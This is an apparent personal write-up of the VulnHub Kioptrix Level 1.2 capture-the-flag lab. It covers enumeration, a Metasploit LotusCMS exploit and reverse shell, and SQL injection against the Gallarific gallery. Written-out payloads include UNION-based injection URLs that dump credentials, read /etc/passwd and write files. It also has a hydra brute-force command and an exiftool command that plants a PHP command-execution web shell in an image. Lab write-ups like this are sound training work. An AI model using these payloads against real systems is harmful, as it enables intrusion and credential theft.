# Kioptrix: Level 1.2 (#3)
[VulnHub link](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)  
By Kioptrix

## Setting Up the Box ##
* The solution provided in kioptrix-level-1 to set up the box works partially for this machine, with the exception of having to set the machine as a `Ubuntu (32-bit)` one instead, as well as heading to the machine's `Settings` > `System` > `Processor` > Tick the `Enable PAE/NX` option. Otherwise, we will get the error that `This kernel requires the following features not present on the CPU: 0:6`.
* Credits to [this Ubuntu forum post](https://ubuntuforums.org/showthread.php?t=905497) for providing the solution.

## Enumeration ##
* We are first greeted with a login page that requires users to specify a set of credentials:
![](/screenshots/kioptrix-level-3/loginInitial.jpg)
* Run `nmap 10.0.2.*`, where we find `10.0.2.15` to be the IP address of the vulnerable machine. 2 services were also discovered, where they are both in an Open state.
![](/screenshots/kioptrix-level-3/nmapHostDiscovery.jpg)
* Run `nmap -sC -sV 10.0.2.15` to enumerate the running services:
![](/screenshots/kioptrix-level-3/nmapHostScan.jpg)
* Let us start with the Apache httpd service at port 80.

## Apache httpd service at Port 80 ##
### Entering Ligoat Security Site ###
* We see the home page belonging to Ligoat Security after loading `http://10.0.2.15/` on our browser:
![](/screenshots/kioptrix-level-3/httpLandingPage.jpg)
* There is a blog page in addition to the home page:
![](/screenshots/kioptrix-level-3/httpBlogPage.jpg)
* We note that there is a gallery link (`http://kioptrix3.com/gallery`), and also a possible username (`loneferret`).
* Visiting the `/gallery` page shows a misaligned page with lots of missing files - we will have to add `10.0.2.15 kioptrix3.com` into our `/etc/hosts` file.

### Ligoat Security - LotusCMS Login Page ###
* We have also got ourselves a login page on top of the earlier 2 pages, where the underlying site appears to have its CMS as `LotusCMS`, based on the information revealed in the page:
![](/screenshots/kioptrix-level-3/httpLoginPage.jpg)
* No unusual parameters in the POST request made for every login attempt. There is a `PHPSESSID` cookie but that would not stop our brute-forcing attempts in this instance.
![](/screenshots/kioptrix-level-3/httpLoginPostRequestIntercepted.jpg)
* All failed login attempts, including failed SQL injection attempts such as `' or 1=1 --` and `' or '1=1' --`, resulted in a `200 OK` response from the server.
* I tried 3 hydra bruteforce attempts in total: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.15 http-form-post '/index.php?system=Admin&page=loginSubmit:username=^USER^&password=^PASS^:username or password'`. First was with the failure string `incorrect`, which turned out to be a wrong one to look out for because there was another error string that I left out. For an invalid set of login credentials, the error message was `Incorrect username or password.`. For an empty field in either of the username or password, the error message was `Username or password left blank.`. After getting the failure string right, I tried brute-forcing for user `loneferret`. All of these 3 attempts came up to nothing.
* Next, I searched for version=specific exploits and found `LotusCMS 3.0 eval() Remote Command Execution`, which has a Metasploit module for it (its Rapid7 page is found [here](https://www.rapid7.com/db/modules/exploit/multi/http/lcms_php_exec)). I was not sure what version of LotusCMS we were facing here, but a shot at it reveals that it does not work in our case:
![](/screenshots/kioptrix-level-3/metasploitLotusCms3.0AttemptFail.jpg)

### NEW: Gsining Reverse Shell (Low Privilege) ###
* **Re-visit**: I spent a day and a half on this machine and still could not get a (low privilege) shell, and decided to look for a hint - and realised that I was actually looking at the correct exploit - but had run it incorrectly! Sigh - somehow I overlooked this several times. The `URI` should have been `/index.php?system=Admin`:
![](/screenshots/kioptrix-level-3/metasploitLotusCms3.0ExploitShell.jpg)
* Finally, we have now got a shell with ourselves as `www-data`.
* Note: I had also used the `php/reverse_php` payload instead of the original meterpreter payload because I did not require the other additional features that it gave (and also lack of familiarity at the moment with the syntax).
* Note: The initial command that is executed (`id`) in this case took a while for the output to be returned to us (and it does not appear to be a one-off thing).
* Running `python -c 'import pty; pty.spawn("/bin/bash")'` to get our interactive TTY shell somehow makes the shell session hang...
* Since the shell returned using Metasploit wasn't stable enough for me, I decided to try out the [second Google result shown](https://github.com/Hood3dRob1n/LotusCMS-Exploit) (when searching for a version-related exploit) - which is a GitHub script.
* Note-to-self: Maybe I should try such results, just in case I got the Metasploit attempt wrong (again).
* Fun fact: If I had visited the script, one of the examples (which had `kioptrix3` in it) would have been a giveaway that this exploit should be used.
* After downloading the script, give it executable permissions, and run it. This was the most interactive script that I've seen (note: the IP and port that it is referring to that of the Kali VM).
![](/screenshots/kioptrix-level-3/shellUsingGithubScript.jpg)
* The netcat shell is a lot more stable now - run `python -c 'import pty; pty.spawn("/bin/bash")'` to get our interactive TTY shell.

### NEW: Exploring Files & Directories ###
* Trying a couple of kernel exploits here, but none currently work at the moment. This includes `Linux Kernel 2.6.x - 'pipe.c' Local Privilege Escalation (2)` ([33322.c](https://www.exploit-db.com/exploits/33322)), which gives us an error message `buf: 0xffffffff Segmentation fault` during runtime.
* Note: I could not use `wget` to download Exploit-DB's code straight, due to SSL errors. Using `vim` in the shell session established was also problematic - the first line of the code seemed to always be missing. Hence, the best way was to use `wget` to download the code from our Kali machine and compile it on the vulnerablle machine itself.
* Next I ran `linuxprivchecker.py` and had a long list of results, including one of them that could work if we could run `sudo -l` successfully (found [here](https://github.com/t0kx/privesc-CVE-2010-0426)). We could not do so at the moment, so we'll keep it in mind for the time being.
* Looking around the `/home` directory of the web server, we find a hash `318d8dd409db395f0317efa71b3bad13e1fb9857` in `admin.dat`, belonging to the `administrator`. However, it seems that no one was able to crack it (there is a `hash.dat` in another directory which is probably required together to crack it, I guess).
![](/screenshots/kioptrix-level-3/shellWebServerAdminDat.jpg)
* We also find in `loneferret`'s home directory a `CompanyPolicy.README` that states to use `sudo ht`. Again, we are unable to run it for the time being because we do not have any credentials yet.
![](/screenshots/kioptrix-level-3/shellLoneFerretCompanyPolicy.jpg)

### NEW: Obtaining phpMyAdmin Credentials ###
* I learnt that we were able to run `find . -name '*.php' | grep config` to find config files, "maybe we can get some interesting hardcoded information from them".
* `./gallery/gconfig.php` turned up as one of the results:
![](/screenshots/kioptrix-level-3/shellGalleryGconfigPhpMyAdminCredentials.jpg)
* It turns out that these are credentials to `phpMyAdmin` - `root:fuckeyou`!
* Note-to-self: I have been having the misconception that the phpMyAdmin database only served the main section of the page - and for subpages such as gallery, it was served by another database.
* Note: The password is **not found in rockyou.txt**, and thus brute-force would not have worked.

### NEW: Obtaining 2 Sets of Credentials through phpMyAdmin ###
* After logging into `phpMyAdmin`:
![](/screenshots/kioptrix-level-3/phpMyAdminLoggedIn.jpg)
* Looking around, we are able to find 2 account's hashes in the `dev_accounts` table under the `gallery` database: `0d3eccfb887aabd50f243b3f155c0f85` for `dreg` and `5badcaf789d3d1d09794d8f021f40f0e` for `loneferret`.
![](/screenshots/kioptrix-level-3/phpMyAdminDevAccountsTable.jpg)
* Using `hash-identifier`, we find out that both of these password hashes are of `MD5` type.
* Next, using [hashkiller](https://hashkiller.co.uk/Cracker/MD5), we are able to crack the hashes and obtain the following set of credentials: `dreg:Mast3r` and `loneferret:starwars`.
* Note: The 2 passwords were **found in rockyou.txt** - I guess brute-forcing for their credentials was the right thing to do, but I did not leave it to run for a long-enough time.

### NEW: Logging into SSH as loneferret ###
* Logging in with the credentials `loneferret:starwars`:
![](/screenshots/kioptrix-level-3/sshLoginAsLoneferret.jpg)
* Tried running the exploit that we found regarding `sudoedit` earlier here, but got the error message`Sorry, user loneferret is not allowed to execute './sudoedit CompanyPolicy.README' as root on Kioptrix3.`
* `sudo -l` gives us 2 results: `!/usr/bin/su` and `/usr/local/bin/ht`. However, I was encountering the error message `Error opening terminal: xterm-256color.` for the latter command.
![](/screenshots/kioptrix-level-3/sshLoneferretSudoDashL.jpg)
* To-be-continued...

### Discovering More Pages/Directories ###
* No `robots.txt` file was found.
* Running `gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirb/common.txt -x .php`, we find a couple of interesting results. (Running it with the file extension .php is definitely more helpful in this case)
![](/screenshots/kioptrix-level-3/httpGobusterDirScanWithFileExt.jpg)
* Loading `update.php` gives us `permission denied`, while `core` returns a blank page.
* Loading `/cache` returns the original home page in a 'bare-bones' manner, with plain HTML.
![](/screenshots/kioptrix-level-3/httpCacheDirectory.jpg)

### phpMyAdmin Exploration ###
* Loading `/phpmyadmin` gives us a login page that appears to expose the version of the SQL server running - `phpMyAdmin 2.11.3deb1ubuntu1.3`:
![](/screenshots/kioptrix-level-3/httpPhpMyAdminLoginPage.jpg)
* Searching for version-specific exploits, I found the `phpMyAdmin - '/scripts/setup.php' PHP Code Injection`, whose Exploit-DB link is [here](https://www.exploit-db.com/exploits/8921). However, one of the requirements are not met because the `/config/` directory was not found to exist.
* I tried SQL injection on the login fields as well: `' or 1=1 --` and `' or '1=1' --`, but to no avail. These attempts (along with ones with invalid login credentials) lead to a `access denied`.
* There was nothing much discovered in the page source as well.
* Running `nikto -h 10.0.2.15` reveals undiscovered phpMyAdmin pages:
![](/screenshots/kioptrix-level-3/niktoScan.jpg)
* These 2 pages confirm that the version of phpMyAdmin that we found earlier is most likely what it is, based on the related pages discovered:
![](/screenshots/kioptrix-level-3/httpPhpMyAdminVersionConfirmation.jpg)
* At this point, I had exhausted where my enumeration and decided to finally edit our `/etc/hosts` file (as mentioned earlier). I did not do this earlier because I was in the midst of my `hydra` attempts and did not want to interrupt them.
* Side-note: The fact that this mapping was explictly mentioned in the VulnHub page and in the login screen when booting up the vulnerable machine definitely highlighted its importance (which is indeed the case as we see later) - but nonetheless, we won't be having any of such explicit mentions in our OSCP exam (and I wanted to practise enumerating what we found to the fullest first).

### Gallery Section Exploration ###
* Loading the `http://kioptrix3.com/gallery` shows us a gallery page that has several photos:
![](/screenshots/kioptrix-level-3/httpGalleryPage.jpg)
* We see that there are 2 pages relating to the gallery page: Home (`/index.php`) and Recent Photos (/`recent.php`).
* Clicking into one of the photo pages (which contains information such as the photo details) changes the URL to `/p.php/[number]`. Visiting `/p.php` draws only the top half of the page with the section bar and no content.
* Viewing the home page's Page Source reveals that there is a hidden page in the comments: `/gadmin`:
![](/screenshots/kioptrix-level-3/httpGalleryPageSource.jpg)
* Accessing the page brings us to another login page with a broken image:
![](/screenshots/kioptrix-level-3/httpGalleryGadminLoginPage.jpg)
* There was a standardised message for an invalid set of credentials: `Your login details were incorrect.`. I decided not to run `hydra` against this login site for now, unless I have exhausted all other avenues for exploration.
* We also note that the Page Source gave us another piece of information: that there is a `/login.php` page. 
![](/screenshots/kioptrix-level-3/httpGalleryLoginPage.jpg)
* Accessing the page gives us an error messaage `Your username or password is incorrect. Please login again.`, with no login input fields.
* The difference between the login pages? I think `Gallarific` was installed for the `/gallery` section of the page, with the `/gadmin` page leading to a Gallarific page while the `/login.php` page was for accessing the local installation.
* I ran `gobuster dir -u http://kioptrix3.com/gallery -w /usr/share/wordlists/dirb/common.txt -x .php` to find out if there were any other pages that we were unaware of:
![](/screenshots/kioptrix-level-3/httpGalleryGobusterDirScanWithFileExt.jpg)
* Accessing `/vote.php` redirects us back to any page that we were on previously.
* Accessing `/gallery.php` gives us an error message that `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by parentid,sort,name' at line 1Could not select category`:
![](/screenshots/kioptrix-level-3/httpGalleryGalleryPhp.jpg)
* It looks like we may have hit jackpot here!

### SQL Injection in Gallery Page ###
* Searching for `gallarific exploit` on Google was most helpful, with the first result pointing us to [an Exploit-DB page](https://www.exploit-db.com/exploits/15891) that was titled `GALLARIFIC PHP Photo Gallery Script - 'gallery.php' SQL Injection`.
* Examining the 2 links provided, we note that the SQL injection is done exactly at the pages where we found the SQL error messages.
* First, let us try `/gallery.php?id=null` first, which says `Empty Gallery` and `No photos have been uploaded. Go back.`.
![](/screenshots/kioptrix-level-3/httpGalleryGalleryIdNull.jpg)
* Changing the `id` value to `1` displays the 3 photos that we see in the home page. It appears that the `/gallery.php` page probably serves as a central gallery for all photos on the website's section.
![](/screenshots/kioptrix-level-3/httpGalleryGalleryId1.jpg)
* Changing the parameter to `2`, `3` or any other number results in the same `Empty Gallery` message.
* Trying out the second link given in the Exploit-DB page (`http://kioptrix3.com/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6,7,8+from+gallarific_users--`) results in an error message: `The used SELECT statements have a different number of columnsCould not select category`
* Searching about this error message turned up a lot of results, which included many questions relating to it on StackOverflow. I found this [particular Stackoverflow post] to be the most helpful amongst all of the others that I found, because it explained clearly about the need for the "same number of columns in each select statement", with a recommendation to "select NULL in the second SELECT for those columns that aren't in the first one".
* Side-note: I found [this StackOverflow post](https://stackoverflow.com/questions/3655708/the-used-select-statements-have-a-different-number-of-columns-redux) initially that was pretty helpful as well, but I could not understand the second point about `The column data type has to match at each position`, presumably because I did not know what data types we were looking at here, though the first point was helpful in getting me to think and dig deeper.
* For the long SQL injection string, I was not exactly sure where to add NULL, and decided to "remove columns" from the long string instead - which turned out to work! I started removing `8`, then `7`, and then `http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--` worked:
![](/screenshots/kioptrix-level-3/httpGalleryGallerySQLInjectAdminCredentials.jpg)
* **Learning point**: Because the number of columns had to match exactly, if we were to try removing `6`, the same SQL error message comes up again.
* Side-track: I was so happy at the page finally not giving an error because I was trying really hard to find a solution to this without referring to a walkthrough. I have yet to learn about databases in depth, and looking at the long SQL injection string gave me a lot of questions as well.
* Side-note: While trying to understand the SQL string, I did not know what `0x3a` stood for (though I could have used a hexadecmial-to-ASCII converter but I wanted more context), and found [this StackOverflow post](https://stackoverflow.com/questions/4042825/explanation-of-particular-sql-injection) that explained things nicely. It represents a colon (`:`).

### Logging into Gallarific Admin Panel ###
* The set of credentials which we had obtained from the SQL injection is `admin:n0t7t1k4`. Tried it on `http://10.0.2.15/index.php?system=Admin` and `http://10.0.2.15/phpmyadmin/`, but both failed to log us in. Finally, I tried it on `http://10.0.2.15/gallery/gadmin/` and we are in!
![](/screenshots/kioptrix-level-3/httpGalleryGadminLoginSuccess.jpg)
* The `Comments` system is disabled, as shown from the missing `/comments.php` when trying to `View comments` from the `Dashboard`.
* Heading to `Presentation` > `Theme Editor`, we find that we are able to view the source code of various parts of the Gallarific site. However, we do not have permissions to edit the source code. I skimmed through the various sections of the source code but did not find anything useful.
![](/screenshots/kioptrix-level-3/httpGalleryThemeEditor.jpg)
* Since we could not edit the source code manually, I headed to `Themes` and managed to change the theme to another colour, which contains the original general Gallarific template. We are able to see the new changes at `http://kioptrix3.com/gallery/`. Nothing much that is unexpected. 
* Navigating to `Users`, I found that we as `admin` (with the `Super User` role), were the only user on the platform.
* I found out that we were able to head to `Photos` and `Upload Photos`. I tried the following ways to get our PHP-reverse-shell code executed (the port intended for the reverse shell connection was `80` (just in case there is a firewall): (No matter what we uploaded, the file extension was always `.jpg`)
1. Uploading `php-reverse-shell.php` (by pentestmonkey) as it is - file name generated in `.jpg`, but not saved into `images` directory.
2. Case 1, but this time, I intercepted the request made by a legitimate photo upload, found its Content-Type to be `image/jpeg`, versus the Content-Type of Case 1 which was `application/x-php`, and modified Case 1's Content-Type to be the one accepted by a legitimate photo upload.
* Our 'image' is now saved into the `images` directory as a `.jpg`, but our code is still not executed.
![](/screenshots/kioptrix-level-3/httpGalleryUploadNewPhotoRequestChangeContentType.jpg)
* Doing a GET request for our `image` shows that our code remains intact, but the Content-Type remains to be `image/jpeg`. On one hand, it allowed for our shell code to be uploaded, but on the other hand, we cannot now trigger the execution of the code.
![](/screenshots/kioptrix-level-3/httpGalleryGetRequestForImageWithCode.jpg)
3. Uploading `php-reverse-shell.php.jpg` (only change in file extension - file contents not modified) - saved into `images` directory as `.jpg` file, but displays an error to say that "the image cannot be displayed because it contains errors". Same output as Case 2.
4. Run `exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' goat.jpg` on a legitimate image - this involves [embedding shell code into an image](https://www.youtube.com/watch?v=nNB9XlRfvzw0). Loading `http://kioptrix3.com/gallery/photos/41980v2zfb.jpg?cmd=id` yielded nothing. Somehow
I could not manage to get Burp Suite to intercept both the request and response regarding the GET request for the image, but our browser tools showed that what was returned was simply the image itself.
5. The `GIF89a?` way of adding it to the beginning of the code (and leaving the file extension as .php) does not work here (very likely because the file extension check is done at the `Content-Type` parameter only), and results in the same result in Case 1.
* Without being able to find a way to get a shell from the admin panel, I went back to the SQL injection vulnerability to look for a way to do so.
* First, I tried to figure out what we could do:
1. Getting SQL database version `5.0.51a-3ubuntu5.4`: `/gallery.php?id=null+and+1=2+union+select+1,@@version,3,4,5,6+from+gallarific_users--`
2. Finding out what that the current user was `root`: `/gallery.php?id=null+and+1=2+union+select+1,user(),3,4,5,6+from+gallarific_users--`
3. Getting the current database directory location, which is `/var/lib/mysql/`:`/gallery.php?id=null+and+1=2+union+select+1,@@datadir,3,4,5,6+from+gallarific_users--`
4. Loading the `/etc/passwd` file contents: `/gallery.php?id=null+and+1=2+union+select+1,load_file('/etc/passwd'),null,4,5,6+from+gallarific_users--`
![](/screenshots/kioptrix-level-3/httpGalleryGallerySQLInjectEtcPasswdFile.jpg)
* We are able to confirm that `loneferret` has an account on the server.
* Note: We see `null` instead of `3` after `load_file`, so as not to print the number as part of our output. 
* Alternative (slight modification at start of SQL string): `/gallery.php?id=null+union+all+select+1,load_file('/etc/passwd'),null,4,5,6+from+gallarific_users--`
5. Write a file to `/tmp` directory: `/gallery.php?id=null+and+1=2+union+select+1,"This message is being written to /tmp/testFile.txt",3,4,5,6+INTO+OUTFILE+'/tmp/sampleWrite.txt'--`
* Note: There is no success message for a successful write. All we see is the `Empty gallery` message.
* We are able to view the file contents by using `load_file`. However, the problem encountered is that 5 other numerical values are written into the file as well: `1 This message is being written to /tmp/testFile.txt 3 4 5 6`.
* According to [this Exploit-DB page](https://www.exploit-db.com/papers/14635), it says that we should "replace the visible columns (i.e. numbers, in URL), with the word `null`, else it will be written into the file together with the next". In this case, the number `3` appeared when we printed `/etc/passwd` just now, so replacing it with `null` (no inverted commas) should technically work out, but instead of printing the number `3`, we see `\N` instead.
* I could swap the `1` with our intended PHP code, and comment out the remaining numbers. However, there was the next issue of where I am able to write the file to, so that I can run the code from our browser. I tried to read the pages' source code in `/var/www/html` and `/var/www/`, which were the traditional places that I knew for a web server's code. However, the `load_file` function returned a blank. Either the source codes were not located there, or that we did not have sufficient permissions (I tried to read files like `/etc/shadow` which had high chances of existence but they drew a blank too).
* Trying to write a file to `/var/www/html/` gives the error `Can't create/write to file '/var/www/html/sampleWrite.txt' (Errcode: 2)Could not select category`.
* `Errcode: 13` was given when I tried to write `/etc/sampleWrite.txt`, or `/var/www/sampleWrite.txt`. From this, we can probably deduce that `/var/www/html` did not exist, and that we are restricted from being able to write to `/var/www`.
* I tried to write `/var/www/kioptrix/sampleWrite.txt` and `/var/www/kioptrix3/sampleWrite.txt`, but both failed as well.
* **Note-to-self**: The whole idea was to write our PHP reverse shell code into an accessible page, and run it from our browser.
* **Re-visit**: After finding the first method to get a shell through the LotusCMS avenue, I wanted to find other methods which I had missed it - and it turns out that we should have searched for tables relating to user information and gotten their credentials! The person did it using `sqlmap` in the walkthrough that I read, so **note-to-self and to-do**: if `sqlmap` has been explictly disallowed for OSCP, are there any other alternatives to it that is allowed, or do we really have to manually craft the SQL injection strings and find our way forward?

## SSH service at Port 22 ##
* Tried to login as `root` - nothing special here (no banners or whatsover).
![](/screenshots/kioptrix-level-3/sshLoginAttemptRoot.jpg)
* After getting a set of credentials `admin:n0t7t1k4`, I tried to login here but to no avail.
* After confirming that `loneferret` has an account, I decided to brute-force with the `rockyou.txt` wordlist, but after running it for a few thousands tries for half an hour, I don't think it worked out.

# Concluding Remarks
1. Learnt how to properly understand the Metasploit/non-Metasploit exploit that I was using, and its importance.
2. Learnt to find important files (such as config files) with an unfamiliar CMS.
3. [To-do] Learnt how to optimise SSH bruteforcing.
4. To-be-added

# Other Walkthrough References
1. https://kongwenbin.wordpress.com/2016/10/30/writeup-for-kioptrix-level-1-2-3/
2. https://medium.com/@Kan1shka9/kioptrix-level-1-2-walkthrough-74753598a6fd
3. https://xapax.github.io/blog/2016/09/04/kioptrix3-walkthrough.html